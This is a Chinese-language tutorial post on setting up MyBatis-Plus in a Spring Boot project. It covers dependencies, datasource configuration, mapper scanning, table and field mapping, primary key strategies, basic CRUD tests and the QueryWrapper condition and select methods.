<h4 id="使用MybatisPlus"><a href="#使用MybatisPlus" class="headerlink" title="使用MybatisPlus"></a>使用MybatisPlus</h4><h5 id="1添加依赖"><a href="#1添加依赖" class="headerlink" title="1添加依赖"></a>1添加依赖</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.baomidou<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-plus-boot-starter<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.5.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>引入<code>mybatis-plus-boot-starter</code>依赖之后,会自动引入SpringBoot开发中所需要的MP所有依赖,不需要再去单独引入了</p>
<h5 id="2配置数据库信息"><a href="#2配置数据库信息" class="headerlink" title="2配置数据库信息"></a>2配置数据库信息</h5><p>resources/application.yml</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://localhost:3306/mp_db?characterEncoding=utf-8&amp;serverTimezone=UTC</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">root</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br></pre></td></tr></table></figure>

<p>时区设置成ShangHai但是报错了,改成UTC先用吧</p>
<h5 id="3创建Mapper接口"><a href="#3创建Mapper接口" class="headerlink" title="3创建Mapper接口"></a>3创建Mapper接口</h5><p>创建Mapper接口继承BaseMapper接口</p>
<p>mapper/UserMapper.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.blue.mapper;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.core.mapper.BaseMapper;</span><br><span class="line"><span class="keyword">import</span> com.blue.domain.User;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">UserMapper</span> <span class="keyword">extends</span> <span class="title">BaseMapper</span>&lt;<span class="title">User</span>&gt;</span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>BaseMapper接口中已经提供了很多常用的方法,所以只需要从容器中获取Mapper就可以进行操作了,不需要自己去编写sql语句</p>
<h5 id="4配置Mapper扫描"><a href="#4配置Mapper扫描" class="headerlink" title="4配置Mapper扫描"></a>4配置Mapper扫描</h5><p>每次配置完Mapper都需要添加一个<code>@Mapper</code>注解很麻烦</p>
<p>可以直接在启动类上配置Mapper所在的包,让其直接进行扫描</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="meta">@MapperScan(&quot;com.blue.mapper&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloApplication</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        SpringApplication.run(HelloApplication.class,args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="获取Mapper进行测试"><a href="#获取Mapper进行测试" class="headerlink" title="获取Mapper进行测试"></a>获取Mapper进行测试</h5><p>起初使用@SpringBootTest注解报红,去网上找了解决办法,导入这个依赖就好了</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework.boot<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-boot-starter-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>测试类的所在位置</p>
<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/image-20220202000821862.png" alt="image-20220202000821862"></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MPTest</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">private</span> UserMapper userMapper;</span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testQueryList</span><span class="params">()</span></span>&#123;</span><br><span class="line">        List&lt;User&gt; users=userMapper.selectList(<span class="keyword">null</span>);</span><br><span class="line">        System.out.println(users);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>此处使用Autowired自动注入报错了,是因为不允许null值</p>
<p>两种解决办法</p>
<ul>
<li>```java<br>@Autowired(required = false)<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">- ```java</span><br><span class="line">  使用@Resource替换@Autowired</span><br></pre></td></tr></table></figure></li>
</ul>
<p>这里又引出了两种注解的区别,去网上找到了一个比较容易理解的回答</p>
<h5 id="Autowired和-Resource区别"><a href="#Autowired和-Resource区别" class="headerlink" title="@Autowired和@Resource区别"></a>@Autowired和@Resource区别</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Autowired</span>注解是按类型装配依赖对象，默认情况下它要求依赖对象必须存在，如果允许<span class="keyword">null</span>值，可以设置它required属性为<span class="keyword">false</span>。<span class="meta">@Resource</span>注解和<span class="meta">@Autowired</span>一样，也可以标注在字段或属性的setter方法上，但它默认按名称装配。名称可以通过<span class="meta">@Resource</span>的name属性指定，如果没有指定name属性，当注解标注在字段上，即默认取字段的名称作为bean名称寻找依赖对象，当注解标注在属性的setter方法上，即默认取属性名作为bean名称寻找依赖对象。 <span class="meta">@Resources</span>按名字，是ＪＤＫ的，<span class="meta">@Autowired</span>按类型，是Spring的。</span><br></pre></td></tr></table></figure>



<h2 id="3-常用设置"><a href="#3-常用设置" class="headerlink" title="3.常用设置"></a>3.常用设置</h2><h3 id="3-1-设置表映射规则"><a href="#3-1-设置表映射规则" class="headerlink" title="3.1 设置表映射规则"></a>3.1 设置表映射规则</h3><p>​    默认情况下MP操作的表名就是实体类的类名，但是如果表名和类名不一致就需要我们自己设置映射规则。</p>
<h4 id="3-1-1-单独设置"><a href="#3-1-1-单独设置" class="headerlink" title="3.1.1 单独设置"></a>3.1.1 单独设置</h4><p>​    可以在实体类的类名上加上@TableName注解进行标识。</p>
<p>例如：</p>
<p>​    如果表名是tb_user，而实体类名是User则可以使用以下写法。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@TableName(&quot;tb_user&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">	<span class="comment">//....</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="3-1-2-全局设置表名前缀"><a href="#3-1-2-全局设置表名前缀" class="headerlink" title="3.1.2 全局设置表名前缀"></a>3.1.2 全局设置表名前缀</h4><p>​    一般一个项目表名的前缀都是统一风格的，这个时候如果一个个设置就太麻烦了。我们可以通过配置来设置全局的表名前缀。</p>
<p>例如：</p>
<p>​    如果一个项目中所有的表名相比于类名都是多了个前缀： <code>tb_</code> 。这可以使用如下方式配置</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">mybatis-plus:</span></span><br><span class="line">  <span class="attr">global-config:</span></span><br><span class="line">    <span class="attr">db-config:</span></span><br><span class="line">      <span class="comment">#表名前缀</span></span><br><span class="line">      <span class="attr">table-prefix:</span> <span class="string">tb_</span></span><br></pre></td></tr></table></figure>

<h3 id="3-2-设置主键生成策略"><a href="#3-2-设置主键生成策略" class="headerlink" title="3.2 设置主键生成策略"></a>3.2 设置主键生成策略</h3><h4 id="3-2-0-测试代码"><a href="#3-2-0-测试代码" class="headerlink" title="3.2.0 测试代码"></a>3.2.0 测试代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testInsert</span><span class="params">()</span></span>&#123;</span><br><span class="line">    User user = <span class="keyword">new</span> User();</span><br><span class="line">    user.setUserName(<span class="string">&quot;lisi&quot;</span>);</span><br><span class="line">    user.setPassword(<span class="string">&quot;7777&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> r = userMapper.insert(user);</span><br><span class="line">    System.out.println(r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-2-1-单独设置"><a href="#3-2-1-单独设置" class="headerlink" title="3.2.1 单独设置"></a>3.2.1 单独设置</h4><p>​    默认情况下使用MP插入数据时，如果在我们没有设置主键生成策略的情况下默认的策略是基于雪花算法的自增id。<strong>雪花算法生成的id数字特别长,但是能保证唯一性</strong></p>
<p>​    如果我们需要使用别的策略可以在定义实体类时，在代表主键的字段上加上<code>@TableId</code>注解，使用其<code>type</code>属性指定主键生成策略。</p>
<p>例如：</p>
<p>​    我们要设置主键自动增长则可以设置如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="meta">@TableId(type = IdType.AUTO)</span></span><br><span class="line">    <span class="keyword">private</span> Long id;</span><br><span class="line">	<span class="comment">//.....</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>全部主键策略定义在了枚举类<code>IdType</code>中，<code>IdType</code>有如下的取值</p>
<ul>
<li><p><code>AUTO</code></p>
<p>数据库ID自增，<strong>依赖于数据库</strong>。该类型请确保数据库设置了 ID自增 否则无</p>
</li>
<li><p><code>NONE</code></p>
<p>未设置主键类型。若在代码中没有手动设置主键，则会根据<strong>主键的全局策略</strong>自动生成（默认的主键全局策略是基于雪花算法的自增ID）</p>
</li>
<li><p><code>INPUT</code></p>
<p>需要手动设置主键，若不设置。插入操作生成SQL语句时，主键这一列的值会是<code>null</code>。</p>
</li>
<li><p><code>ASSIGN_ID</code></p>
<p>当没有手动设置主键，即实体类中的主键属性为空时，才会自动填充，使用雪花算法</p>
</li>
<li><p><code>ASSIGN_UUID</code></p>
<p>当实体类的主键属性为空时，才会自动填充，使用UUID</p>
</li>
</ul>
<h4 id="3-2-2-全局设置"><a href="#3-2-2-全局设置" class="headerlink" title="3.2.2 全局设置"></a>3.2.2 全局设置</h4><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">mybatis-plus:</span></span><br><span class="line">  <span class="attr">global-config:</span></span><br><span class="line">    <span class="attr">db-config:</span></span><br><span class="line">      <span class="comment"># id生成策略 auto为数据库自增</span></span><br><span class="line">      <span class="attr">id-type:</span> <span class="string">auto</span></span><br></pre></td></tr></table></figure>

<h3 id="3-3-设置字段映射关系"><a href="#3-3-设置字段映射关系" class="headerlink" title="3.3 设置字段映射关系"></a>3.3 设置字段映射关系</h3><p>​    默认情况下MP会根据实体类的属性名去映射表的列名。</p>
<p>​    如果数据库的列表和实体类的属性名不一致了我们可以使用<code>@TableField</code>注解的<code>value</code>属性去设置映射关系。</p>
<p>​    </p>
<p>例如：</p>
<p>​    如果表中一个列名叫 address而 实体类中的属性名为addressStr则可以使用如下方式进行配置。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@TableField(&quot;address&quot;)</span></span><br><span class="line"><span class="keyword">private</span> String addressStr;</span><br></pre></td></tr></table></figure>

<h3 id="3-4-设置字段和列名的驼峰映射"><a href="#3-4-设置字段和列名的驼峰映射" class="headerlink" title="3.4 设置字段和列名的驼峰映射"></a>3.4 设置字段和列名的驼峰映射</h3><p>​    默认情况下MP会开启字段名列名的驼峰映射， 即从经典数据库列名 A_COLUMN（下划线命名） 到经典 Java 属性名 aColumn（驼峰命名） 的类似映射 。</p>
<p>​    如果需要关闭我们可以使用如下配置进行关闭。</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">mybatis-plus:</span></span><br><span class="line">  <span class="attr">configuration:</span></span><br><span class="line">	<span class="comment">#是否开启自动驼峰命名规则（camel case）映射，即从经典数据库列名 A_COLUMN（下划线命名） 到经典 Java 属性名 aColumn（驼峰命名） 的类似映射</span></span><br><span class="line">    <span class="attr">map-underscore-to-camel-case:</span> <span class="literal">false</span></span><br></pre></td></tr></table></figure>

<h3 id="3-5-日志"><a href="#3-5-日志" class="headerlink" title="3.5 日志"></a>3.5 日志</h3><p>​    如果需要打印MP操作对应的SQL语句等，可以配置日志输出。</p>
<p>配置方式如下：</p>
<figure class="highlight yml"><table><tr><td class="code"><pre><span class="line"><span class="attr">mybatis-plus:</span></span><br><span class="line">  <span class="attr">configuration:</span></span><br><span class="line">    <span class="comment"># 日志</span></span><br><span class="line">    <span class="attr">log-impl:</span> <span class="string">org.apache.ibatis.logging.stdout.StdOutImpl</span></span><br></pre></td></tr></table></figure>

<h2 id="4-基本使用"><a href="#4-基本使用" class="headerlink" title="4.基本使用"></a>4.基本使用</h2><h3 id="4-1-插入数据"><a href="#4-1-插入数据" class="headerlink" title="4.1 插入数据"></a>4.1 插入数据</h3><p>​    我们可以使用insert方法来实现数据的插入。</p>
<p>示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testInsert</span><span class="params">()</span></span>&#123;</span><br><span class="line">    User user = <span class="keyword">new</span> User();</span><br><span class="line">    user.setUserName(<span class="string">&quot;zhangsan&quot;</span>);</span><br><span class="line">    user.setPassword(<span class="string">&quot;7777888&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> r = userMapper.insert(user);</span><br><span class="line">    System.out.println(r);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-2-删除操作"><a href="#4-2-删除操作" class="headerlink" title="4.2 删除操作"></a>4.2 删除操作</h3><p>​    我们可以使用<strong>deleteXXX</strong>方法来实现数据的删除。</p>
<p>示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testDelete</span><span class="params">()</span></span>&#123;</span><br><span class="line">    List&lt;Integer&gt; ids = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    ids.add(<span class="number">5</span>);</span><br><span class="line">    ids.add(<span class="number">6</span>);</span><br><span class="line">    ids.add(<span class="number">7</span>);</span><br><span class="line">    <span class="keyword">int</span> i = userMapper.deleteBatchIds(ids);<span class="comment">//该方法使用id的list来批量根据id来删除</span></span><br><span class="line">    System.out.println(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testDeleteById</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = userMapper.deleteById(<span class="number">8</span>);<span class="comment">//根据id来删除</span></span><br><span class="line">    System.out.println(i);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testDeleteByMap</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Map&lt;String, Object&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="comment">//map里面封装的其实是删除的条件</span></span><br><span class="line">    map.put(<span class="string">&quot;name&quot;</span>,<span class="string">&quot;提姆&quot;</span>);</span><br><span class="line">    map.put(<span class="string">&quot;age&quot;</span>,<span class="number">22</span>);<span class="comment">//删除的是name为提姆,age为22的记录</span></span><br><span class="line">    <span class="keyword">int</span> i = userMapper.deleteByMap(map);</span><br><span class="line">    System.out.println(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-3-更新操作"><a href="#4-3-更新操作" class="headerlink" title="4.3 更新操作"></a>4.3 更新操作</h3><p>​    我们可以使用<strong>updateXXX</strong>方法来实现数据的删除。</p>
<p>示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testUpdate</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="comment">//把id为2的用户的年龄改为14</span></span><br><span class="line">    User user = <span class="keyword">new</span> User();</span><br><span class="line">    user.setId(<span class="number">2L</span>);<span class="comment">//因为id是一个long类型的</span></span><br><span class="line">    user.setAge(<span class="number">14</span>);</span><br><span class="line">    <span class="keyword">int</span> i = userMapper.updateById(user);</span><br><span class="line">    System.out.println(i);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="5-条件构造器Wrapper"><a href="#5-条件构造器Wrapper" class="headerlink" title="5.条件构造器Wrapper"></a>5.条件构造器Wrapper</h2><h3 id="5-1-概述"><a href="#5-1-概述" class="headerlink" title="5.1 概述"></a>5.1 概述</h3><p>​    我们在实际操作数据库的时候会涉及到很多的条件。所以MP为我们提供了一个功能强大的条件构造器 <code>Wrapper</code> 。使用它可以让我们非常方便的构造条件。</p>
<p>​    其继承体系如下：</p>
<p>​    <img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/img/wrapper%E7%BB%A7%E6%89%BF%E4%BD%93%E7%B3%BB%E5%9B%BE.png" alt="image-20210823105447044"></p>
<p>​    在其子类<code>AbstractWrapper</code>中提供了很多用于构造Where条件的方法。</p>
<p>​    <code>AbstractWrapper</code>的子类<code>QueryWrapper</code>则额外提供了用于针对Select语法的<code>select</code>方法。可以用来设置查询哪些列。</p>
<p>​    <code>AbstractWrapper</code>的子类<code>UpdateWrapper</code>则额外提供了用于针对SET语法的<code>set</code>方法。可以用来设置对哪些列进行更新。</p>
<p>​    完整的AbstractWrapper方法可以参照：<a href="https://baomidou.com/guide/wrapper.html#abstractwrapper">https://baomidou.com/guide/wrapper.html#abstractwrapper</a></p>
<p>介绍是用来干什么的。它的实现类有哪些</p>
<p>QueryWrapper,UpdateWrapper，【LambdaQueryWrapper】</p>
<h3 id="5-2-常用AbstractWrapper方法"><a href="#5-2-常用AbstractWrapper方法" class="headerlink" title="5.2 常用AbstractWrapper方法"></a>5.2 常用AbstractWrapper方法</h3><blockquote>
<p>eq：equals，等于<br>gt：greater than ，大于 &gt;<br>ge：greater than or equals，大于等于≥<br>lt：less than，小于&lt;<br>le：less than or equals，小于等于≤<br>between：相当于SQL中的BETWEEN<br>like：模糊匹配。like(“name”,”黄”)，相当于SQL的name like ‘%黄%’<br>likeRight：模糊匹配右半边。likeRight(“name”,”黄”)，相当于SQL的name like ‘黄%’<br>likeLeft：模糊匹配左半边。likeLeft(“name”,”黄”)，相当于SQL的name like ‘%黄’<br>notLike：notLike(“name”,”黄”)，相当于SQL的name not like ‘%黄%’<br>isNull<br>isNotNull<br>and：SQL连接符AND<br>or：SQL连接符OR</p>
<p>in: in(“age”,{1,2,3})相当于 age in(1,2,3)</p>
<p>groupBy: groupBy(“id”,”name”)相当于 group by id,name</p>
<p>orderByAsc :orderByAsc(“id”,”name”)相当于 order by id ASC,name ASC</p>
<p>orderByDesc :orderByDesc (“id”,”name”)相当于 order by id DESC,name DESC</p>
</blockquote>
<h4 id="示例一"><a href="#示例一" class="headerlink" title="示例一"></a>示例一</h4><p>SQL语句如下： </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT </span><br><span class="line">	id,user_name,PASSWORD,NAME,age,address </span><br><span class="line">FROM </span><br><span class="line">	USER </span><br><span class="line">WHERE </span><br><span class="line">	age &gt; 18 AND address = &#x27;狐山&#x27;</span><br></pre></td></tr></table></figure>

<p>如果用Wrapper写法如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testWrapper01</span><span class="params">()</span></span>&#123;</span><br><span class="line">    QueryWrapper wrapper = <span class="keyword">new</span> QueryWrapper();</span><br><span class="line">    wrapper.gt(<span class="string">&quot;age&quot;</span>,<span class="number">18</span>);</span><br><span class="line">    wrapper.eq(<span class="string">&quot;address&quot;</span>,<span class="string">&quot;狐山&quot;</span>);</span><br><span class="line">    List&lt;User&gt; users = userMapper.selectList(wrapper);</span><br><span class="line">    System.out.println(users);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="示例二"><a href="#示例二" class="headerlink" title="示例二"></a>示例二</h4><p>SQL语句如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT </span><br><span class="line">	id,user_name,PASSWORD,NAME,age,address </span><br><span class="line">FROM </span><br><span class="line">	USER </span><br><span class="line">WHERE </span><br><span class="line">	id IN(1,2,3) AND </span><br><span class="line">	age BETWEEN 12 AND 29 AND </span><br><span class="line">	address LIKE &#x27;%山%&#x27;</span><br></pre></td></tr></table></figure>



<p>如果用Wrapper写法如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testWrapper02</span><span class="params">()</span></span>&#123;</span><br><span class="line">    QueryWrapper&lt;User&gt; wrapper = <span class="keyword">new</span> QueryWrapper&lt;&gt;();</span><br><span class="line">    wrapper.in(<span class="string">&quot;id&quot;</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line">    wrapper.between(<span class="string">&quot;age&quot;</span>,<span class="number">12</span>,<span class="number">29</span>);</span><br><span class="line">    wrapper.like(<span class="string">&quot;address&quot;</span>,<span class="string">&quot;山&quot;</span>);</span><br><span class="line">    List&lt;User&gt; users = userMapper.selectList(wrapper);</span><br><span class="line">    System.out.println(users);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="示例三"><a href="#示例三" class="headerlink" title="示例三"></a>示例三</h4><p>SQL语句如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT </span><br><span class="line">	id,user_name,PASSWORD,NAME,age,address </span><br><span class="line">FROM </span><br><span class="line">	USER </span><br><span class="line">WHERE </span><br><span class="line">	id IN(1,2,3) AND </span><br><span class="line">	age &gt; 10 </span><br><span class="line">ORDER BY </span><br><span class="line">	age DESC</span><br></pre></td></tr></table></figure>

<p>如果用Wrapper写法如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testWrapper03</span><span class="params">()</span></span>&#123;</span><br><span class="line">    QueryWrapper&lt;User&gt; queryWrapper = <span class="keyword">new</span> QueryWrapper&lt;&gt;();</span><br><span class="line">    queryWrapper.in(<span class="string">&quot;id&quot;</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>);</span><br><span class="line">    queryWrapper.gt(<span class="string">&quot;age&quot;</span>,<span class="number">10</span>);</span><br><span class="line">    queryWrapper.orderByDesc(<span class="string">&quot;age&quot;</span>);</span><br><span class="line">    List&lt;User&gt; users = userMapper.selectList(queryWrapper);</span><br><span class="line">    System.out.println(users);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="5-3-常用QueryWrapper方法"><a href="#5-3-常用QueryWrapper方法" class="headerlink" title="5.3 常用QueryWrapper方法"></a>5.3 常用QueryWrapper方法</h3><pre><code> QueryWrapper的 select 可以设置要查询的列。
</code></pre>
<h4 id="示例一-1"><a href="#示例一-1" class="headerlink" title="示例一"></a>示例一</h4><blockquote>
<p>select(String… sqlSelect) 方法的测试为要查询的列名</p>
</blockquote>
<p>SQL语句如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT </span><br><span class="line">	id,user_name</span><br><span class="line">FROM </span><br><span class="line">	USER </span><br></pre></td></tr></table></figure>

<p>MP写法如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testSelect01</span><span class="params">()</span></span>&#123;</span><br><span class="line">    QueryWrapper&lt;User&gt; queryWrapper = <span class="keyword">new</span> QueryWrapper&lt;&gt;();</span><br><span class="line">    queryWrapper.select(<span class="string">&quot;id&quot;</span>,<span class="string">&quot;user_name&quot;</span>);</span><br><span class="line">    List&lt;User&gt; users = userMapper.selectList(queryWrapper);</span><br><span class="line">    System.out.println(users);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h4 id="示例二-1"><a href="#示例二-1" class="headerlink" title="示例二"></a>示例二</h4><blockquote>
<p>select(Class<T> entityClass, Predicate<TableFieldInfo> predicate)</p>
</blockquote>
<p>方法的第一个参数为实体类的字节码对象，第二个参数为Predicate类型，可以使用lambda的写法，过滤要查询的字段 (主键除外) 。</p>
<p>SQL语句如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT </span><br><span class="line">	id,user_name</span><br><span class="line">FROM </span><br><span class="line">	USER </span><br></pre></td></tr></table></figure>

<p>MP写法如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testSelect02</span><span class="params">()</span></span>&#123;</span><br><span class="line">    QueryWrapper&lt;User&gt; queryWrapper = <span class="keyword">new</span> QueryWrapper&lt;&gt;();</span><br><span class="line">    queryWrapper.select(User.class, <span class="keyword">new</span> Predicate&lt;TableFieldInfo&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">test</span><span class="params">(TableFieldInfo tableFieldInfo)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;user_name&quot;</span>.equals(tableFieldInfo.getColumn());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    List&lt;User&gt; users = userMapper.selectList(queryWrapper);</span><br><span class="line">    System.out.println(users);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h4 id="示例三-1"><a href="#示例三-1" class="headerlink" title="示例三"></a>示例三</h4><blockquote>
<p>select(Predicate<TableFieldInfo> predicate)</p>
</blockquote>
<p>方法第一个参数为Predicate类型，可以使用lambda的写法，过滤要查询的字段 (主键除外) 。</p>
<p>SQL语句如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SELECT </span><br><span class="line">	id,user_name,PASSWORD,NAME,age </span><br><span class="line">FROM </span><br><span class="line">	USER</span><br></pre></td></tr></table></figure>

<p>就是<strong>不查询address</strong>这列，其他列都查询了</p>
<p>MP写法如下：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">testSelect03</span><span class="params">()</span></span>&#123;</span><br><span class="line">    QueryWrapper&lt;User&gt; queryWrapper = <span class="keyword">new</span> QueryWrapper&lt;&gt;(<span class="keyword">new</span> User());</span><br><span class="line">    queryWrapper.select(<span class="keyword">new</span> Predicate&lt;TableFieldInfo&gt;() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">test</span><span class="params">(TableFieldInfo tableFieldInfo)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="string">&quot;address&quot;</span>.equals(tableFieldInfo.getColumn());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    List&lt;User&gt; users = userMapper.selectList(queryWrapper);</span><br><span class="line">    System.out.println(users);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







